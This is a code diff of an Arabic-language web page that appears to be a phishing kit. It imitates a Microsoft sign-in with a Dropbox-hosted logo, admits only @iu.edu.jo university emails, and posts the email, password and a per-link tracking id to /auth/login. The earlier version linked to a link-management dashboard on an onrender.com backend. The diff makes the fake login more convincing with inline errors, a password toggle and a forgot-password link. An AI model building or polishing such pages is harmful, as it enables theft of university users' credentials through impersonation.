@@ -5,12 +5,13 @@
   <title>تسجيل الدخول</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
       background: #f3f2f1;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      margin: 0;
     }
     .login-box {
       background: #fff;
@@ -27,17 +28,33 @@
     .login-box h2 {
       margin-bottom: 20px;
       color: #333;
+      font-size: 18px;
+      line-height: 1.4;
+    }
+    .input-group {
+      position: relative;
+      margin: 10px 0;
+      text-align: left;
     }
     .form-control {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+      padding: 12px 45px 12px 12px;
       border: 1px solid #ccc;
       border-radius: 4px;
-      text-align: left;
+      font-size: 14px;
       direction: ltr;
+      box-sizing: border-box;
     }
-    button {
+    .input-icon {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      color: #666;
+      font-size: 18px;
+      pointer-events: none;
+    }
+    .btn {
       background: #0067b8;
       color: #fff;
       border: none;
@@ -46,71 +63,83 @@
       border-radius: 4px;
       cursor: pointer;
       font-size: 16px;
-      margin-top: 10px;
     }
-    button:hover {
+    .btn:hover {
       background: #005a9e;
     }
-    .hidden {
+    .footer-link {
+      margin-top: 15px;
+      display: block;
+      color: #0067b8;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .footer-link:hover {
+      text-decoration: underline;
+    }
+    .error-msg {
+      color: #a80000;
+      font-size: 13px;
+      text-align: left;
+      margin-top: 5px;
       display: none;
-    }
-    .btn-secondary {
-      background: #ccc;
-      color: #000;
-    }
-    .btn-secondary:hover {
-      background: #bbb;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <img src="https://www.dropbox.com/scl/fi/e7adn2nk9mfef0q1akjs2/Microsoft_logo_-2012.svg?rlkey=35k2k9o7d9r223b16yy7lybfd&e=1&st=oj7kfx6d&dl=1" alt="Microsoft Logo">
-    <h2>تسجيل الدخول</h2>
-
-    <!-- الخطوة الأولى: إدخال البريد -->
-    <div id="emailStep">
-      <input type="email" id="emailInput" class="form-control" placeholder="البريد الإلكتروني" required>
-      <button onclick="nextStep()">التالي</button>
-      <button class="btn-secondary" onclick="goBackLinks()">رجوع</button>
+    <img src="https://www.dropbox.com/scl/fi/e7adn2nk9mfef0q1akjs2/Microsoft_logo_-2012.svg?rlkey=35k2k9o7d9r223b16yy7lybfd&dl=1" alt="Microsoft Logo">
+    <h2 id="title">تسجيل الدخول باستخدام بريدك الجامعي</h2>
+    
+    <!-- خطوة إدخال البريد -->
+    <div id="step-email">
+      <div class="input-group">
+        <input type="email" id="email" class="form-control" placeholder="البريد الإلكتروني" required>
+        <span class="input-icon">@</span>
+      </div>
+      <div id="emailError" class="error-msg">❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo</div>
+      <button class="btn" onclick="validateEmail()">التالي</button>
     </div>
-
-    <!-- الخطوة الثانية: إدخال كلمة المرور -->
-    <form id="passwordStep" action="/auth/login" method="POST" class="hidden">
+    
+    <!-- خطوة إدخال كلمة المرور -->
+    <form id="step-password" action="/auth/login" method="POST" style="display:none;">
+      <div class="input-group">
+        <input type="password" id="password" name="password" class="form-control" placeholder="كلمة المرور" required>
+        <span class="input-icon" onclick="togglePassword()">👁</span>
+      </div>
       <input type="hidden" id="hiddenEmail" name="email">
-      <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
       <input type="hidden" id="linkId" name="id">
-      <button type="submit">تسجيل الدخول</button>
-      <button type="button" class="btn-secondary" onclick="backToEmail()">رجوع</button>
+      <button type="submit" class="btn">تسجيل الدخول</button>
+      <a href="#" class="footer-link">هل نسيت كلمة المرور؟</a>
     </form>
   </div>
 
   <script>
-    // قراءة قيمة id من رابط الصفحة
+    // تمرير ID الرابط ليصل للنموذج
     const params = new URLSearchParams(window.location.search);
     const linkId = params.get('id');
     if (linkId) {
       document.getElementById('linkId').value = linkId;
     }
 
-    function nextStep() {
-      const email = document.getElementById('emailInput').value.trim();
-      if (!email.endsWith('@iu.edu.jo')) {
-        alert('❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo');
-        return;
+    function validateEmail() {
+      const emailInput = document.getElementById('email');
+      const email = emailInput.value.trim();
+      const errorDiv = document.getElementById('emailError');
+      if (email.endsWith('@iu.edu.jo')) {
+        document.getElementById('hiddenEmail').value = email;
+        document.getElementById('step-email').style.display = 'none';
+        document.getElementById('step-password').style.display = 'block';
+        document.getElementById('title').innerText = email;
+        errorDiv.style.display = 'none';
+      } else {
+        errorDiv.style.display = 'block';
       }
-      document.getElementById('hiddenEmail').value = email;
-      document.getElementById('emailStep').classList.add('hidden');
-      document.getElementById('passwordStep').classList.remove('hidden');
     }
 
-    function backToEmail() {
-      document.getElementById('passwordStep').classList.add('hidden');
-      document.getElementById('emailStep').classList.remove('hidden');
-    }
-
-    function goBackLinks() {
-      window.location.href = "https://video-dashboard-backend.onrender.com/viewlinks.html";
+    function togglePassword() {
+      const p = document.getElementById('password');
+      p.type = p.type === 'password' ? 'text' : 'password';
     }
   </script>
 </body>
